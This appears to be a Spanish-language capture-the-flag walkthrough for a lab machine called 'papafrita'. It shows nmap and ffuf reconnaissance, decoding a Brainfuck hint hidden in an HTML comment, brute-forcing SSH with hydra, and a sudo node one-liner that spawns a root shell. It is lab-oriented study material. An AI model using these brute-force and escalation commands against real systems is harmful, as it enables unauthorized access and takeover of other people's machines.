# Recon

En primer lugar identificamos la IP mediante `netdiscover`

```zsh
netdiscover
	...         
 192.168.1.169
	...                                                
```


## IP Objetivo
```
 192.168.1.169
```


## Nmap
Con Nmap escaneamos los puertos de la máquina y generamos un informe para visualizar más cómodamente los resultados:

```zsh
nmap -p 0-65535 -T5 -A -sT -Pn -n 192.168.1.169 -oX scan.xml && xsltproc scan.xml -o scan.html
```

### Puertos
No hay nada especialmente llamativo abierto, un servidor SSH por el 22 y HTTP por el 80.


## Web
Analizando el código fuente de la landing de Apache con `CTRL+U`, me encuentro con esto:
```html
<!-- <div class="table_of_contents floating_element"> <div class="section_header section_header_grey"> TABLE OF CONTENTS </div> <div class="table_of_contents_item floating_element"> <a href="#about">About</a> </div> <div class="table_of_contents_item floating_element"> <a href="#changes">Changes</a> </div> <div class="table_of_contents_item floating_element"> <a href="#scope">Scope</a> </div> <div class="table_of_contents_item floating_element"> <a href="#files">Config files</a> </div> </div> ++++++++++[>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++>++++++++++>++++++++++>+++++++++++>+++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++>++++++++++++>+++++++++++>+++++++++++>++++++++++<<<<<<<<<<<<<<<<<<<<-]>---.>--.>---.>+.>--.>---.>-.>---.>--.>-----.>+.>.>----.>---.>--.>---.>-----.>+.>++.>---. -->
```

En el final del comentario hay un blob encodeado en brainfuck, lo pasamos por un decoder online y el resultado es este:

```
abuelacalientalasopa

abuela calienta la sopa
ACLS
acls
```

Podría ser una contraseña o una pista, a falta de más información haremos algo de dirbusting.


## Disbusting
Primero, una pasada rapidita a los directorios que no saca nada útil.

```zsh
ffuf -u "http://192.168.1.169/FUZZ" -w /usr/share/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt -c -ic -t 100 -r 
```

Una segunda pasada en busca de archivos con una lista normalista de extensiones tampoco revela nada

```zsh
ffuf -u "http://192.168.1.169/FUZZ" -w ...raft-large-files-lowercase.txt  -c -ic -t 100 -r -e .php,.html,.db... -fw 20
```



# Fuerza bruta
Al probar `/abuelacalientalasopa` como directorio en la web da un 404, así que pruebo un ataque con `hydra`, asumiendo que es una contraseña y pasando un diccionario de usuarios.

Pruebo varias combinaciones, 'abuelacalientalasopa' como password y como usuario, con listas como rockyou o xato-net-10-million-usernames. Al final opto por hacer un diccionario con algunas combinaciones sencillas y probar a ponerlo en ambas posiciones.

```zsh
cat dict 
	abuela
	abuelacalienta
	abuelacalientalasopa
	calientalasopa
	lasopa
	sopa
	acls

hydra -f -L dict -P dict  -s 22 ssh://192.168.1.169 -t 64 -I
	...
[22][ssh] host: 192.168.1.169   login: abuela   password: *****
```



# Post explotación
Accedemos por SSH como el usuario `abuela`. Al ejecutar `sudo -l`, una búsqueda rápida en GTFObins nos resuelve el laboratorio.

```zsh
abuela@papafrita:~$ sudo -l
	...
User abuela may run the following commands on papafrita:
    (root) NOPASSWD: /usr/bin/node

abuela@papafrita:~$ sudo node -e 'require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'

root@papafrita:/home/abuela: id
uid=0(root) gid=0(root) grupos=0(root)
root@papafrita:/home/abuela: cat /root/root.txt /home/abuela/user.txt 
*****
*****
root@papafrita:/home/abuela: 

```